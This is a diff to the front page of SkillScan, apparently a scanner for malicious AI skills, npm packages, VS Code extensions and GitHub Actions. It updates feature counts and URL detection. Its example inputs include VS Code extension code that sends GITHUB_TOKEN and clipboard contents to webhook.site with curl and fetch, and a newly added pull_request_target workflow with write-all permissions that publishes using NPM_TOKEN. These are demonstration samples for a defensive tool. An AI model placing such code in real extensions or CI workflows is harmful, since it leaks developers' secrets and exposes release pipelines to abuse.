@@ -34,21 +34,26 @@ const EXAMPLES = [
     label: 'VS Code exfiltration',
     value: `import * as vscode from 'vscode';\n\nexport async function activate() {\n  const terminal = vscode.window.createTerminal('update');\n  terminal.sendText('curl https://webhook.site/vscode -d "$GITHUB_TOKEN"');\n  const token = process.env.GITHUB_TOKEN;\n  await fetch('https://webhook.site/vscode', {\n    method: 'POST',\n    body: JSON.stringify({ token, clipboard: await vscode.env.clipboard.readText() })\n  });\n}`,
   },
+  {
+    label: 'GitHub Action',
+    value: `name: publish from pr\n\non:\n  pull_request_target:\n\npermissions: write-all\n\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: tj-actions/changed-files@v45\n      - run: npm publish\n        env:\n          NPM_TOKEN: \${{ secrets.NPM_TOKEN }}`,
+  },
 ];
 
 const PROOF_POINTS = [
-  '20 deterministic checks',
+  '25 deterministic checks',
   'AI skills',
   'npm packages',
   'VS Code extensions',
+  'GitHub Actions',
   'malicious fixture corpus',
 ];
 
 const VALIDATION_POINTS = [
   {
     label: 'Malicious fixtures',
-    value: '7',
-    detail: 'Skill, npm, and VS Code attacks for token exfiltration, install-time execution, broad activation, and persistence must block.',
+    value: '10',
+    detail: 'Skill, npm, VS Code, registry-intel, and CI workflow attacks for token theft, install execution, and release-pipeline abuse must block.',
   },
   {
     label: 'False-positive corpus',
@@ -57,10 +62,18 @@ const VALIDATION_POINTS = [
   },
   {
     label: 'Regression gate',
-    value: '5',
-    detail: 'Tests, malicious fixtures, local skills, lint, and production build run before release.',
+    value: '6',
+    detail: 'Tests, malicious fixtures, local skills, lint, production build, and browser checks run before release.',
   },
 ];
+
+const SUPPORTED_URL_PATTERN = /^(https?:\/\/)?(github\.com|raw\.githubusercontent\.com|claudhub\.ai|clawdhub\.ai|molthub\.ai|(?:www\.)?npmjs\.com|open-vsx\.org)\/|^(pkg:npm\/|npm:)/i;
+
+function detectInputType(value: string): 'url' | 'code' {
+  const trimmed = value.trim();
+  if (trimmed.includes('\n')) return 'code';
+  return SUPPORTED_URL_PATTERN.test(trimmed) ? 'url' : 'code';
+}
 
 function DotMatrixLoader({ label = 'Scanning' }: { label?: string }) {
   return (
@@ -93,14 +106,6 @@ export default function Home() {
   const [focused, setFocused] = useState(false);
   const textareaRef = useRef<HTMLTextAreaElement>(null);
 
-  const detect = (v: string): 'url' | 'code' => {
-    const trimmed = v.trim();
-    if (trimmed.includes('\n')) return 'code';
-    return /^(https?:\/\/)?(github\.com|raw\.githubusercontent\.com|claudhub\.ai|clawdhub\.ai|molthub\.ai|(?:www\.)?npmjs\.com|open-vsx\.org)\/|^(pkg:npm\/|npm:)/i.test(trimmed)
-      ? 'url'
-      : 'code';
-  };
-
   const scan = async () => {
     if (!input.trim() || scanning) return;
     setScanning(true);
@@ -108,7 +113,7 @@ export default function Home() {
     setResult(null);
 
     try {
-      const type = detect(input);
+      const type = detectInputType(input);
       const res = await fetch('/api/scan', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -196,7 +201,7 @@ export default function Home() {
                 onChange={(e) => setInput(e.target.value)}
                 onFocus={() => setFocused(true)}
                 onBlur={() => setFocused(false)}
-                placeholder="Paste a GitHub, ClawdHub, npm, or OpenVSX URL. Or paste code directly..."
+                placeholder="Paste a GitHub, ClawdHub, npm, or OpenVSX URL. Or paste code/workflows directly..."
                 className="w-full bg-white/[0.03] rounded-lg px-4 py-4 text-[14px] text-white/90 placeholder:text-white/20 resize-none leading-relaxed transition-colors duration-200"
                 rows={input.includes('\n') ? Math.min(input.split('\n').length + 1, 10) : 3}
                 onKeyDown={(e) => e.key === 'Enter' && e.metaKey && scan()}
@@ -208,7 +213,7 @@ export default function Home() {
                   animate={{ opacity: 1 }}
                   transition={spring.responsive}
                 >
-                  {detect(input)}
+                  {detectInputType(input)}
                 </motion.span>
               )}
             </div>
@@ -223,7 +228,7 @@ export default function Home() {
                     setInput(ex.value);
                     textareaRef.current?.focus();
                   }}
-                  className="hover:text-white/50 transition-colors duration-200 underline underline-offset-2 decoration-white/10 hover:decoration-white/30"
+                  className="pressable hover:text-white/50 underline underline-offset-2 decoration-white/10 hover:decoration-white/30"
                 >
                   {ex.label}
                 </button>
@@ -241,7 +246,7 @@ export default function Home() {
             <motion.button
               onClick={scan}
               disabled={scanning || !input.trim()}
-              className="w-full py-3.5 rounded-lg text-[14px] font-medium transition-colors duration-200 disabled:opacity-30 disabled:cursor-not-allowed bg-white/[0.08] hover:bg-white/[0.12] text-white/80 hover:text-white"
+              className="pressable w-full py-3.5 rounded-lg text-[14px] font-medium disabled:opacity-30 disabled:cursor-not-allowed bg-white/[0.08] hover:bg-white/[0.12] text-white/80 hover:text-white"
               whileHover={!scanning && input.trim() ? { y: -1 } : {}}
               whileTap={!scanning && input.trim() ? { scale: 0.985 } : {}}
               transition={spring.responsive}
@@ -304,7 +309,7 @@ function ValidationSection() {
         <div>
           <h2 className="text-[14px] font-medium text-white/70">Security validation</h2>
           <p className="mt-1 max-w-[520px] text-[12px] leading-relaxed text-white/35">
-            SkillScan is tested against committed malicious fixtures and a local false-positive corpus before production deploys.
+            SkillScan is tested against incident-derived malicious fixtures, benign controls, and a local false-positive corpus before production deploys.
           </p>
         </div>
         <a
